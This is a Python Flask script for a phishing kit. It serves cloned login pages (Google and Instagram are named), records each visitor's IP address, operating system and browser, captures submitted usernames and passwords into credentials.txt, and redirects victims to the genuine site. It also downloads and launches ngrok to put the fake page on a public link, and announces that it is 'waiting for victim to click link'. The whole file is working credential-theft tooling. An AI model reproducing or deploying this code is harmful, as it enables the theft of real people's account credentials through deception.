import os
import time
import json
import requests
import threading
from flask import Flask, render_template, redirect, request, jsonify


# colors
GREEN = '\x1b[32m'
RED = '\x1b[31m'
BLUE = '\x1b[34m'
WHITE = '\x1b[37m'
YELLOW = '\x1b[33m'
LIGHT_BLUE = '\x1b[96m'
LIGHT_GREEN = '\x1b[92m'
LIGHT_RED = '\x1b[91m'
RESET = '\x1b[39m'

WEBSITE = ""
URL = ""


app = Flask(__name__)


@app.route('/', methods=["GET", "POST"])
def index():
    IP = request.remote_addr
    user_agent = request.headers['User-Agent']
    tmp_data = user_agent.split('(')[1].split(')')[0].split(';', 1)
    OS = tmp_data[0]+tmp_data[1].split(';', 1)[0]
    browser = user_agent.split(" ")[-1]

    print(f"""\n{YELLOW}[{GREEN}*{YELLOW}]{GREEN} {WEBSITE} was visited by: {WHITE}{IP}\n    {WHITE}-> OS: {GREEN}{OS}\n    {WHITE}-> browser: {GREEN}{browser}{RESET}\n""")
    return render_template(f'{WEBSITE.lower()}.html')


@app.route('/<requested>', methods=['GET', 'POST'])
def redirect_to_instagram(requested):
    if requested == "creds":
        return redirect("/")

    return redirect(URL+requested)


@app.route('/login', methods=["POST"])
def get_credentials_2():
    try:
        IP = request.remote_addr
        user_agent = request.headers['User-Agent']
        username = request.form['username']
        password = request.form['password']
    except:
        print(
            f"\n{YELLOW}[{RED}!{YELLOW}]{RED} Make sure to change sent data inside template! Data were recieved but there isn't data in form: username=^USER^&password=^PASS^!\n    > Data: {request.form}")
        return redirect("/")

    print(f"""\n{YELLOW}[{LIGHT_GREEN}+{YELLOW}]{GREEN} Captured credentials!\n    {WHITE}-> Username: {GREEN}{username}\n    {WHITE}-> Password: {GREEN}{password}{RESET}\n""")

    with open(f"{os.getcwd()}/sites/{WEBSITE}/credentials.txt", "a+") as file:
        file.write(
            f"""[{IP}] Username: {username}, Password: {password}\n    -> User-Agent: {user_agent}\n""")

    return redirect(URL)


@app.route('/creds', methods=["POST"])
def get_credentials():
    try:
        IP = request.remote_addr
        user_agent = request.headers['User-Agent']
        username = request.form['username']
        password = request.form['password']
    except:
        print(
            f"\n{YELLOW}[{RED}!{YELLOW}]{RED} Make sure to change sent data inside template! Data were recieved but there isn't data in form: username=^USER^&password=^PASS^!\n    > Data: {request.form}")
        if WEBSITE != "Google":
            return redirect("/")
        else:
            print(
                f"""\n{YELLOW}[{LIGHT_GREEN}+{YELLOW}]{GREEN} Captured credentials!\n    {WHITE}-> Username: {GREEN}{username}""")
            return redirect("/login")

    print(f"""\n{YELLOW}[{LIGHT_GREEN}+{YELLOW}]{GREEN} Captured credentials!\n    {WHITE}-> Username: {GREEN}{username}\n    {WHITE}-> Password: {GREEN}{password}{RESET}\n""")

    with open(f"{os.getcwd()}/sites/{WEBSITE}/credentials.txt", "a+") as file:
        file.write(
            f"""[{IP}] Username: {username}, Password: {password}\n    -> User-Agent: {user_agent}\n""")

    return redirect(URL)


@app.route('/ajax/<requested>', methods=['POST'])
def ajax():
    return jsonify(
        status='ok'
    )


@app.route('/<requested>', methods=['OPTIONS'])
def root_options():
    return


def main_website():
    global WEBSITE, URL

    websites = os.listdir('./sites')
    print(f"{LIGHT_BLUE}Choose:")
    for counter, website in enumerate(websites, start=1):
        if counter % 4 == 0:
            print()
        print(f"{YELLOW}[{RED}{counter}{YELLOW}]{RED} " +
              website, end=" "*(30-len(website)))
    wanted_website = ""
    while not wanted_website or counter < int(wanted_website) or int(wanted_website) <= 0:
        wanted_website = input(f"\n{LIGHT_BLUE}>>{LIGHT_RED} ")
        if not wanted_website or counter < int(wanted_website) or int(wanted_website) <= 0:
            print(f"{RED}Number out of choice!{RESET}")
    WEBSITE = websites[int(wanted_website)-1]
    url_file = f"{os.getcwd()}/sites/{WEBSITE}/url.txt"
    if not os.path.isfile(url_file):
        URL = input(
            f"{YELLOW}[{RED}!{YELLOW}]{RED} URL file not found! Type in url to {GREEN}{WEBSITE}{RED} >>{GREEN} ")
        if not URL.endswith("/"):
            URL += "/"
        with open(url_file, "a+") as f:
            f.write(URL)

    with open(url_file) as f:
        URL = f.read()


def main(port=80, local=True, debug=True):
    main_website()
    ngrok()
    if local:
        app.run(host='127.0.0.1', port=port, debug=debug,
                threaded=True)

    else:
        app.run(host='0.0.0.0', port=port, debug=debug, threaded=True)


def get_url():
    return json.loads(requests.get("http://localhost:4040/api/tunnels").content.decode())['tunnels'][1]['public_url']


def _ngrok(counter=1):
    try:
        os.system(
            "wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1")
        time.sleep(10)
        os.system("unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1")
        os.system("chmod +x ngrok")
        os.system("rm -rf ngrok-stable-linux-amd64.zip")
    except:
        if counter == 1:
            print(
                f"{YELLOW}[{RED}-{YELLOW}]{LIGHT_GREEN} Something bad happened while installing ngrok, retrying...")
            counter += 1
            _ngrok(counter)

        if counter == 2:
            print(
                f"{YELLOW}[{RED}-{YELLOW}]{LIGHT_GREEN} Something bad happened while installing ngrok, retrying (2nd time)...")
            counter += 1
            _ngrok(counter)

        if counter == 3:
            print(
                f"{YELLOW}[{RED}-{YELLOW}]{LIGHT_GREEN} Something bad happened while installing ngrok, exiting...")
            exit(-1)

        counter += 1


def ngrok():
    try:
        get_url()

    except:
        current_ngrok = os.getcwd()+"/ngrok"
        if os.path.isfile(current_ngrok):
            os.system(f"{current_ngrok} http {PORT} > /dev/null 2>&1 &")
        elif os.path.isfile("/usr/bin/ngrok"):
            os.system(f"/usr/bin/ngrok http {PORT} > /dev/null 2>&1 &")
        else:
            print(
                f"{YELLOW}[{RED}-{YELLOW}]{LIGHT_GREEN} Ngrok not found{RESET}")
            ngrok_path = input(
                f'Specify path to ngrok (press ENTER if ngrok is not installed)>>{RED} '
            )

            if not ngrok_path or not os.path.isfile(ngrok_path):
                print("Ngrok not FOUND - IF")
                ngrok_path = _extracted_from_ngrok_17()
            os.system(f"{ngrok_path} http {PORT} > /dev/null 2>&1 &")

    finally:
        print(RESET)
        print(
            f"{YELLOW}[{LIGHT_GREEN}*{YELLOW}]{GREEN} Started Ngrok successfully (PORT:{PORT}){RESET}")
        time.sleep(5)
        print(
            f"{YELLOW}[{WHITE}*{YELLOW}]{GREEN} Waiting for victim to click link: {get_url()}{RESET}")

# TODO Rename this here and in `ngrok`


def _extracted_from_ngrok_17():
    ngrok_thread = threading.Thread(target=_ngrok)
    ngrok_thread.start()
    counter = 0
    while ngrok_thread.is_alive():
        counter += 1
        if counter == 1:
            print(
                f"{YELLOW}[{WHITE}*{YELLOW}]{LIGHT_GREEN} Installing Ngrok...", end='\r')
        elif counter % 7 == 0:
            print(
                f"{YELLOW}[{WHITE}*{YELLOW}]{LIGHT_GREEN} Installing Ngrok../", end='\r')
        elif counter % 6 == 0:
            print(
                f"{YELLOW}[{WHITE}*{YELLOW}]{LIGHT_GREEN} Installing Ngrok..|", end='\r')
        elif counter % 5 == 0:
            print(
                f"{YELLOW}[{WHITE}*{YELLOW}]{LIGHT_GREEN} Installing Ngrok..\\", end='\r')
        elif counter % 4 == 0:
            print(
                f"{YELLOW}[{WHITE}*{YELLOW}]{LIGHT_GREEN} Installing Ngrok..|", end='\r')
        elif counter % 3 == 0:
            print(
                f"{YELLOW}[{WHITE}*{YELLOW}]{LIGHT_GREEN} Installing Ngrok..-", end='\r')
        elif counter % 2 == 0:
            print(
                f"{YELLOW}[{WHITE}*{YELLOW}]{LIGHT_GREEN} Installing Ngrok../", end='\r')
        time.sleep(0.2)
    print(
        f"{YELLOW}[{LIGHT_GREEN}+{YELLOW}]{GREEN} Installed Ngrok successfully!", end='\r')
    return os.getcwd()+"/ngrok"


if __name__ == '__main__':
    PORT = 1337
    DEBUG = False
    main(port=PORT, debug=DEBUG)
